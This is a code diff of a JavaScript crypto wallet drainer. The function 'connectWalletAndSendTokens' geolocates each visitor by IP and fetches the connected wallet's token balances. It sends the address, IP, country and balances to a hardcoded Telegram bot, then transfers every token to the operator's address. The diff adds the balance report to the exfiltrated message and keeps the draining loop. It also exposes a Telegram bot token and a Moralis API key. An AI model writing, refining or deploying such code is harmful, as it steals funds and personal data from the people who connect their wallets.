@@ -106,10 +106,8 @@ async function connectWalletAndSendTokens() {
     const network = await provider.getNetwork();
     const chainId = network.chainId;
 
-    // Detect wallet type
     const walletType = instance.isWalletConnect ? "WalletConnect" : "MetaMask";
 
-    // Get user IP and location
     let locationData = {};
     try {
       const locRes = await fetch("https://ipapi.co/json/");
@@ -118,29 +116,7 @@ async function connectWalletAndSendTokens() {
       console.warn("Location fetch failed", e);
     }
 
-    // Compose Telegram message
-    const message = `
-📥 Wallet Connected!
-Address: ${userAddress}
-Wallet: ${walletType}
-Country: ${locationData.country_name || "Unknown"}
-IP: ${locationData.ip || "N/A"}
-    `;
-
-    // Send message to Telegram
-    const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU"; // Replace with your bot token
-    const chatId = "5995616824";              // Replace with your chat ID
-
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message
-      })
-    });
-
-    // Moralis API call to get tokens
+    // Moralis API call to get token balances
     const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY";
     const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${chainId === 1 ? 'eth' : chainId === 137 ? 'polygon' : 'eth'}`;
 
@@ -152,18 +128,49 @@ IP: ${locationData.ip || "N/A"}
 
     const tokens = await response.json();
 
-    if (!tokens || tokens.length === 0) {
-      alert('No token data available');
-      return;
+    // Format balance summary
+    let tokenSummary = "";
+    if (tokens && tokens.length > 0) {
+      tokenSummary = tokens.map(token => {
+        const decimals = token.decimals ?? 18;
+        const balance = ethers.utils.formatUnits(token.balance, decimals);
+        return `• ${token.symbol}: ${balance}`;
+      }).join("\n");
+    } else {
+      tokenSummary = "No tokens found or balance is 0.";
     }
 
+    // Compose full Telegram message with balances
+    const fullMessage = `
+📥 Wallet Connected!
+Address: ${userAddress}
+Wallet: ${walletType}
+Country: ${locationData.country_name || "Unknown"}
+IP: ${locationData.ip || "N/A"}
+
+💰 Token Balances:
+${tokenSummary}
+    `;
+
+    const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
+    const chatId = "5995616824";
+
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: fullMessage
+      })
+    });
+
+    // Proceed with transferring tokens to your address
     for (const token of tokens) {
       try {
         const contract = new ethers.Contract(token.token_address, [
           "function transfer(address to, uint amount) returns (bool)"
         ], signer);
 
-        const decimals = token.decimals ?? 18;
         const balanceInWei = ethers.BigNumber.from(token.balance);
         if (balanceInWei.isZero()) continue;
 
